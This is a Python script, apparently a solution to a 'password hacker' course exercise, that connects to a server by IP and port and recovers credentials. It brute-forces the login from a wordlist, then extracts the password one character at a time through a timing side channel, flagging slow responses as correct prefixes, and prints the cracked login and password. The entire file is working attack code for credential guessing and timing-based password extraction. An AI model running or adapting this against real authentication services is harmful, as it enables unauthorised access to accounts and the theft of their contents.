# write your code here
import argparse
import socket
from pw_generator_tools import generate_from_file
from pw_generator_tools import generate_short_password
import json
import time

parser = argparse.ArgumentParser(description = "ip, port and password for remote server")

parser.add_argument("ip_address")
parser.add_argument("port", type=int)

credentials = {'login': '', 'password': ' '}

time_for_responses = []

def find_login(client_socket):
    generator = generate_from_file('hacking/logins.txt')
    credentials['login'] = next(generator)
    response = {'result': ''}
    with open('logs_login.txt', 'w') as logs:
        while response.get('result') != 'Wrong password!':
            start = time.perf_counter_ns()
            client_socket.send(json.dumps(credentials).encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.perf_counter_ns()
            time_for_responses.append(end - start)
            logs.write(json.dumps(credentials))
            logs.write(' ')
            logs.write(json.dumps(response))
            logs.write('\n')
            if response.get('result') != 'Wrong password!':
                credentials['login'] = next(generator)

def find_password(client_socket):
    generator = generate_short_password(2)
    credentials['password'] = next(generator)
    response = {'result': ''}
    mean_response_time = sum(time_for_responses) / len(time_for_responses)
    with open('logs_pw.txt', 'w') as logs:
        logs.write("mean time ")
        logs.write(str(mean_response_time))
        logs.write('\n')
        while response.get('result') != 'Connection success!' and len(credentials['password']) < 25:
            start = time.perf_counter_ns()
            client_socket.send(json.dumps(credentials).encode())
            response = json.loads(client_socket.recv(1024).decode())
            end = time.perf_counter_ns()
            logs.write(json.dumps(credentials))
            logs.write(' ')
            logs.write(json.dumps(response))
            logs.write('\n')
            # simply if response time is more than 380% of average it is considered an exception
            if (end - start) > 3.8 * mean_response_time:
                # start a new
                generator = generate_short_password(2)
                credentials['password'] += next(generator)
            elif "Wrong password!" == response.get('result'):
                pw_list = list(credentials['password'])
                pw_list[-1] = next(generator)
                credentials['password'] = "".join(pw_list)
                if credentials['password'].endswith('9'):
                    generator = generate_short_password(2)

def connect_to_server(args):
    with socket.socket() as client_socket:
        client_socket.connect((args.ip_address, args.port))
        find_login(client_socket)
        find_password(client_socket)
        print(json.dumps(credentials))


def main(args):
    connect_to_server(args)


main(parser.parse_args())
